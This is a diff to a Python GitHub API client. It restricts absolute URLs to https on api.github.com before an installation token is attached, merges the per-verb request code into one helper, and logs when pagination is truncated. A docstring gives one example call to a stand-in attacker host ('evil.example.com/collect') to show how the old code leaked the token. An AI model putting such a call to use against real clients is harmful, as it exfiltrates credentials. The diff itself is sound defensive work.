@@ -16,6 +16,8 @@ WHY THIS MATTERS:
 """
 
 import logging
+from urllib.parse import urlparse
+
 import requests
 from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
@@ -29,6 +31,11 @@ GITHUB_API = "https://api.github.com"
 DEFAULT_TIMEOUT = 20
 MAX_RETRIES = 3
 RETRY_BACKOFF = 0.5  # 0.5s, 1s, 2s between retries
+
+# Every request from this module carries an installation token in an
+# Authorization header, so the set of hosts it may address is a security
+# boundary, not a convenience.
+API_HOST = urlparse(GITHUB_API).hostname or "api.github.com"
 
 
 class GitHubError(Exception):
@@ -166,21 +173,79 @@ def _handle_response(r: requests.Response, method: str, path: str, token: str = 
     )
 
 
+def _resolve_url(path: str) -> str:
+    """Turn a caller's path into an absolute URL, refusing to leave GitHub.
+
+    gh_get used to accept any string beginning with "http" as a complete URL
+    and send the installation token to it. Nothing in this repository passes
+    an externally-derived URL today — every call site builds a literal
+    "/repos/{repo}/..." — so this was a latent primitive rather than a live
+    hole. It is still the wrong default for a function that attaches a
+    credential to every request:
+
+        gh_get("https://evil.example.com/collect", token)
+        -> GET https://evil.example.com/collect
+           Authorization: Bearer <installation token>
+
+    Absolute URLs are worth keeping, because GitHub's own pagination and
+    `*_url` fields are absolute, but they must point at GitHub. A payload
+    field is one refactor away from reaching here, and webhook payloads are
+    attacker-influenced on a fork PR.
+
+    Host is compared exactly. A suffix check would accept
+    "api.github.com.evil.example", which is a domain anyone can register.
+    """
+    if not path.startswith(("http://", "https://")):
+        return f"{GITHUB_API}{path}"
+
+    parsed = urlparse(path)
+    if parsed.scheme != "https" or parsed.hostname != API_HOST:
+        raise GitHubError(
+            f"Refusing to send a GitHub token to {parsed.hostname or path!r}. "
+            f"Absolute URLs must be https and on {API_HOST}.",
+            0,
+        )
+    return path
+
+
 # ── Core HTTP methods — all use retry session ─────────────────────────────────
+#
+# One helper rather than five near-identical bodies. They had drifted before:
+# every verb needs check_and_wait, the same ConnectionError mapping, and the
+# token threaded into _handle_response so rate-limit headers are attributed to
+# the right installation, and each of those was a line someone could forget
+# when adding a verb. Now there is one place to forget it, and it is covered.
+
+
+def _request(method: str, path: str, token: str, **kwargs) -> dict | list:
+    check_and_wait(token)
+    url = _resolve_url(path)
+    try:
+        r = _session.request(
+            method, url, headers=_headers(token), timeout=DEFAULT_TIMEOUT, **kwargs
+        )
+    except requests.exceptions.ConnectionError as e:
+        raise GitHubError(f"Connection error: {e}", 0) from e
+    return _handle_response(r, method, path, token)
 
 
 def gh_get(path: str, token: str) -> dict | list:
-    check_and_wait(token)
-    url = path if path.startswith("http") else f"{GITHUB_API}{path}"
-    try:
-        r = _session.get(url, headers=_headers(token), timeout=DEFAULT_TIMEOUT)
-    except requests.exceptions.ConnectionError as e:
-        raise GitHubError(f"Connection error: {e}", 0) from e
-    return _handle_response(r, "GET", path, token)
+    return _request("GET", path, token)
 
 
 def gh_get_all(path: str, token: str, max_pages: int = 5) -> list:
-    """Auto-paginate — returns ALL results across pages."""
+    """Auto-paginate. Returns up to max_pages * 100 results.
+
+    It does NOT return "ALL results across pages", which is what this said for
+    as long as it has existed. It stops after max_pages — 500 items by default
+    — and used to do so in silence, indistinguishably from having reached the
+    end. A caller counting open issues on a busy repository got 500 and no
+    indication that there were more, which is the shape of bug that gets
+    believed: the number looks plausible.
+
+    Hitting the cap is now logged, because a truncated answer a caller knows
+    about is a different thing from one it does not.
+    """
     results = []
     sep = "&" if "?" in path else "?"
 
@@ -198,48 +263,34 @@ def gh_get_all(path: str, token: str, max_pages: int = 5) -> list:
         if isinstance(data, list):
             results.extend(data)
             if len(data) < 100:
-                break
+                # A short page is the end of the collection, so this is the
+                # one exit that means "all of it".
+                return results
         else:
             return data
+    else:
+        # The loop ran to max_pages without a short page, so GitHub very
+        # likely has more. Only reachable when the last page was full.
+        log.warning(
+            f"gh_get_all truncated at max_pages={max_pages} ({len(results)} items) "
+            f"for {path} — there are probably more results that this call did "
+            f"not return. Raise max_pages if the caller needs the full set."
+        )
 
     return results
 
 
 def gh_post(path: str, token: str, data: dict) -> dict:
-    check_and_wait(token)
-    url = f"{GITHUB_API}{path}"
-    try:
-        r = _session.post(url, headers=_headers(token), json=data, timeout=DEFAULT_TIMEOUT)
-    except requests.exceptions.ConnectionError as e:
-        raise GitHubError(f"Connection error: {e}", 0) from e
-    return _handle_response(r, "POST", path, token)
+    return _request("POST", path, token, json=data)
 
 
 def gh_put(path: str, token: str, data: dict) -> dict:
-    check_and_wait(token)
-    url = f"{GITHUB_API}{path}"
-    try:
-        r = _session.put(url, headers=_headers(token), json=data, timeout=DEFAULT_TIMEOUT)
-    except requests.exceptions.ConnectionError as e:
-        raise GitHubError(f"Connection error: {e}", 0) from e
-    return _handle_response(r, "PUT", path, token)
+    return _request("PUT", path, token, json=data)
 
 
 def gh_patch(path: str, token: str, data: dict) -> dict:
-    check_and_wait(token)
-    url = f"{GITHUB_API}{path}"
-    try:
-        r = _session.patch(url, headers=_headers(token), json=data, timeout=DEFAULT_TIMEOUT)
-    except requests.exceptions.ConnectionError as e:
-        raise GitHubError(f"Connection error: {e}", 0) from e
-    return _handle_response(r, "PATCH", path, token)
+    return _request("PATCH", path, token, json=data)
 
 
 def gh_delete(path: str, token: str) -> dict:
-    check_and_wait(token)
-    url = f"{GITHUB_API}{path}"
-    try:
-        r = _session.delete(url, headers=_headers(token), timeout=DEFAULT_TIMEOUT)
-    except requests.exceptions.ConnectionError as e:
-        raise GitHubError(f"Connection error: {e}", 0) from e
-    return _handle_response(r, "DELETE", path, token)
+    return _request("DELETE", path, token)
